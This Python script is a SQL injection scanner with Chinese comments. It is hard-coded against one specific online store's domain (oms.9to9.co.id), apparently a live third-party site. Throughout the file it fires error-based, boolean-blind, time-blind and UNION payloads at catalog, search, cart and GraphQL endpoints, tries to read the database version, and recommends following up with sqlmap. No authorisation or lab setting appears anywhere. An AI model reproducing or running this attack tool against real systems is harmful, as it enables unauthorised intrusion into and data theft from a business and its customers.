#!/usr/bin/env python3
"""
SQL注入深度扫描器 - 9to9.co.id
系统化测试所有可能的SQL注入点
"""

import requests
import urllib3
import time
from urllib.parse import quote
urllib3.disable_warnings()

class SQLiScanner:
    def __init__(self):
        self.base_url = "https://oms.9to9.co.id"
        self.graphql_url = f"{self.base_url}/graphql"
        self.session = requests.Session()
        self.session.verify = False
        self.found = []
        
    def log(self, msg, level="info"):
        colors = {"success": "\033[92m", "error": "\033[91m", "warning": "\033[93m", "info": "\033[94m"}
        print(f"{colors.get(level, '')}{msg}\033[0m")
        
    def test_error_based(self, url, param):
        """错误型注入检测"""
        payloads = ["'", "\"", "\\", "')", "';", "' OR '1'='1", "' AND '1'='2", "1' UNION SELECT NULL--"]
        
        self.log(f"[错误型] 测试 {url}?{param}=", "info")
        
        for payload in payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                r = self.session.get(test_url, timeout=5)
                
                # 检查SQL错误特征
                errors = ['mysql', 'syntax', 'sql', 'database', 'warning', 'error', 'exception', 
                         'mysqli', 'odbc', 'postgres', 'oracle', 'sqlite']
                
                for error in errors:
                    if error in r.text.lower():
                        self.log(f"  [!] 可能存在SQL注入: {payload} -> {error}", "warning")
                        self.found.append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'type': 'error-based',
                            'evidence': error
                        })
                        return True
                        
            except Exception as e:
                pass
                
        return False
    
    def test_time_based(self, url, param):
        """时间盲注检测"""
        self.log(f"[时间盲注] 测试 {url}?{param}=", "info")
        
        # 正常请求
        try:
            start = time.time()
            r = self.session.get(f"{url}?{param}=1", timeout=10)
            normal_time = time.time() - start
            
            # SLEEP注入
            payloads = [
                "1' AND SLEEP(5)--",
                "1' AND (SELECT SLEEP(5))--",
                "1'; WAITFOR DELAY '00:00:05'--",
                "1' AND BENCHMARK(10000000,MD5('test'))--"
            ]
            
            for payload in payloads:
                start = time.time()
                r = self.session.get(f"{url}?{param}={quote(payload)}", timeout=15)
                sleep_time = time.time() - start
                
                if sleep_time > normal_time + 4:  # 至少延迟4秒
                    self.log(f"  [!!!] 时间盲注成功: {payload} -> {sleep_time:.2f}s", "success")
                    self.found.append({
                        'url': f"{url}?{param}=",
                        'param': param,
                        'payload': payload,
                        'type': 'time-based',
                        'evidence': f'延迟{sleep_time:.2f}秒'
                    })
                    return True
                    
        except Exception as e:
            pass
            
        return False
    
    def test_boolean_based(self, url, param):
        """布尔盲注检测"""
        self.log(f"[布尔盲注] 测试 {url}?{param}=", "info")
        
        try:
            # True条件
            r1 = self.session.get(f"{url}?{param}=1' AND '1'='1", timeout=5)
            len1 = len(r1.text)
            
            # False条件  
            r2 = self.session.get(f"{url}?{param}=1' AND '1'='2", timeout=5)
            len2 = len(r2.text)
            
            # 如果返回长度明显不同
            if abs(len1 - len2) > 100:
                self.log(f"  [!] 可能存在布尔盲注: True={len1}, False={len2}", "warning")
                self.found.append({
                    'url': f"{url}?{param}=",
                    'param': param,
                    'type': 'boolean-based',
                    'evidence': f'True长度={len1}, False长度={len2}'
                })
                return True
                
        except Exception as e:
            pass
            
        return False
    
    def test_union_based(self, url, param):
        """UNION注入检测"""
        self.log(f"[UNION注入] 测试 {url}?{param}=", "info")
        
        # 先检测列数
        for cols in range(1, 10):
            null_str = ','.join(['NULL'] * cols)
            payload = f"1' UNION SELECT {null_str}--"
            
            try:
                r = self.session.get(f"{url}?{param}={quote(payload)}", timeout=5)
                
                # 如果没有错误，可能列数正确
                if 'error' not in r.text.lower() and 'exception' not in r.text.lower():
                    self.log(f"  [!] 可能列数: {cols}", "warning")
                    
                    # 尝试提取数据
                    payload2 = f"1' UNION SELECT {null_str.replace('NULL', 'VERSION()', 1)}--"
                    r2 = self.session.get(f"{url}?{param}={quote(payload2)}", timeout=5)
                    
                    if 'mysql' in r2.text.lower() or any(str(x) in r2.text for x in range(5,9)):
                        self.log(f"  [!!!] UNION注入成功!", "success")
                        self.found.append({
                            'url': f"{url}?{param}=",
                            'param': param,
                            'payload': payload2,
                            'type': 'union-based',
                            'evidence': f'{cols}列'
                        })
                        return True
            except:
                pass
                
        return False
    
    def test_graphql_sqli(self):
        """GraphQL SQL注入检测"""
        self.log("[GraphQL] 测试SQL注入", "info")
        
        payloads = [
            '{ products(search: "test\'") { items { name } } }',
            '{ products(filter: {sku: {eq: "test\'"}}) { items { name } } }',
            '{ products(filter: {name: {match: "test\' OR \'1\'=\'1"}}) { items { name } } }'
        ]
        
        for payload in payloads:
            try:
                r = self.session.post(
                    self.graphql_url,
                    json={'query': payload},
                    timeout=5
                )
                
                if 'error' in r.text.lower() and any(x in r.text.lower() for x in ['mysql', 'sql', 'syntax']):
                    self.log(f"  [!] GraphQL可能存在SQL注入", "warning")
                    self.found.append({
                        'url': self.graphql_url,
                        'payload': payload,
                        'type': 'graphql-sqli'
                    })
                    
            except Exception as e:
                pass
    
    def scan(self):
        self.log("="*60, "info")
        self.log("  SQL注入深度扫描器", "info")
        self.log("="*60, "info")
        
        # 测试URL参数
        test_points = [
            ('/catalog/product/view', 'id'),
            ('/catalogsearch/result', 'q'),
            ('/checkout/cart/add', 'product'),
            ('/customer/section/load', 'sections'),
            ('/', 'id'),
            ('/', 'file'),
            ('/', 'page')
        ]
        
        for path, param in test_points:
            url = f"{self.base_url}{path}"
            
            # 依次测试各种注入类型
            self.test_error_based(url, param)
            self.test_boolean_based(url, param)
            self.test_time_based(url, param)
            self.test_union_based(url, param)
            
            time.sleep(0.5)
        
        # 测试GraphQL
        self.test_graphql_sqli()
        
        # 报告结果
        self.log("\n" + "="*60, "info")
        self.log(f"  扫描完成! 发现 {len(self.found)} 个可能的注入点", "info" if len(self.found) == 0 else "success")
        self.log("="*60, "info")
        
        if self.found:
            self.log("\n发现的注入点:", "success")
            for i, finding in enumerate(self.found, 1):
                self.log(f"\n[{i}] {finding.get('type', 'unknown').upper()}", "success")
                self.log(f"  URL: {finding.get('url', 'N/A')}", "info")
                self.log(f"  参数: {finding.get('param', 'N/A')}", "info")
                self.log(f"  Payload: {finding.get('payload', 'N/A')}", "warning")
                self.log(f"  证据: {finding.get('evidence', 'N/A')}", "warning")
        else:
            self.log("\n未发现明显的SQL注入漏洞", "info")
            self.log("建议:", "info")
            self.log("  1. 使用sqlmap进行更深入扫描", "info")
            self.log("  2. 手工测试更多参数", "info")
            self.log("  3. 测试POST请求和JSON输入", "info")

if __name__ == "__main__":
    scanner = SQLiScanner()
    scanner.scan()
